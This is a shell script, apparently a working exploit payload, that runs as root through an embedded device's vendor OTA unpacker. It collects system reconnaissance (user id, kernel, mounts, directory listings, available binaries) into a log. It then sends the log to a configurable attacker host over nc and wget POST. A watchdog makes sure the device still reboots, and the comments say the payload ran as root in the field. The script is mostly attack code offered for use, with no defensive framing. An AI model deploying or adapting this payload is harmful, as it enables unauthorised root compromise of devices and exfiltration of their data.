#!/bin/sh
# OTA "unpacker" recon payload - runs as root through the vendor OTA client.
#
# Status: PARTIALLY CONFIRMED.  The script itself ran as root in the field,
# but no callback arrived: `nc` and `wget` were not usable in that rootfs
# build.  The recon output is written to /tmp/ota_payload.log.
#
# Configure the callback by editing HOST / EXFIL_PORT / LIMIT below, or by
# exporting them in the environment that starts otaunpack.  The vendor client
# normally starts the payload from its boot environment, so editing the file
# is the reliable way.
#
# Hard requirement: this script must terminate.  otasrv calls waitpid() on
# otaunpack; if the payload blocks forever, otasrv never reaches
# system("reboot") and the device is unreachable until a power cycle.  Every
# network attempt has a short timeout and a watchdog kills the script after
# LIMIT seconds.
#
# Note: /tmp is usually a tmpfs, so the log disappears on the reboot that
# follows this script.  Use a working callback, or read the log while the
# script is still running.

LOG=/tmp/ota_payload.log
HOST=${HOST:-}
EXFIL_PORT=${EXFIL_PORT:-9001}
LIMIT=${LIMIT:-60}

: > "$LOG" 2>/dev/null
exec >>"$LOG" 2>&1

# Watchdog: background sleep, then terminate this shell.  Capture the main PID
# first; this also covers a blocking nc/wget.
MAIN=$$
( sleep "$LIMIT"; kill -TERM "$MAIN" ) >/dev/null 2>&1 &
WATCHDOG=$!

echo "=== START ==="
date 2>/dev/null

echo "--- id"
id 2>&1
echo "--- uname -a"
uname -a 2>&1

for f in /proc/cmdline /proc/mounts; do
  if [ -r "$f" ]; then
    echo "--- $f"
    cat "$f" 2>&1
  fi
done

for d in / /bin /sbin /usr/bin /usr/sbin /system/bin /appconfigs /data /customer; do
  if [ -d "$d" ]; then
    echo "--- ls -la $d"
    ls -la "$d" 2>&1
  fi
done

if command -v busybox >/dev/null 2>&1; then
  echo "--- busybox --list"
  busybox --list 2>&1
fi

echo "--- which"
for c in id uname cat ls mount ps ifconfig nc wget telnetd httpd dropbear sshd; do
  p=$(which "$c" 2>/dev/null)
  echo "$c: ${p:-missing}"
done

if [ -n "$HOST" ]; then
  echo "--- callbacks to $HOST:$EXFIL_PORT"

  if command -v nc >/dev/null 2>&1; then
    echo "try nc"
    nc -w 3 "$HOST" "$EXFIL_PORT" < "$LOG" || echo "nc failed"
  fi

  if command -v busybox >/dev/null 2>&1; then
    echo "try busybox nc"
    busybox nc -w 3 "$HOST" "$EXFIL_PORT" < "$LOG" || echo "busybox nc failed"
    echo "try busybox wget"
    busybox wget -q -T 3 -O /dev/null --post-file="$LOG" \
      "http://$HOST:$EXFIL_PORT/" || echo "busybox wget failed"
  fi

  if command -v wget >/dev/null 2>&1; then
    echo "try wget"
    wget -q -T 3 -O /dev/null --post-file="$LOG" \
      "http://$HOST:$EXFIL_PORT/" || echo "wget failed"
  fi
else
  echo "--- no HOST set, skipping callbacks"
fi

kill "$WATCHDOG" 2>/dev/null
wait "$WATCHDOG" 2>/dev/null
echo "=== END ==="
exit 0
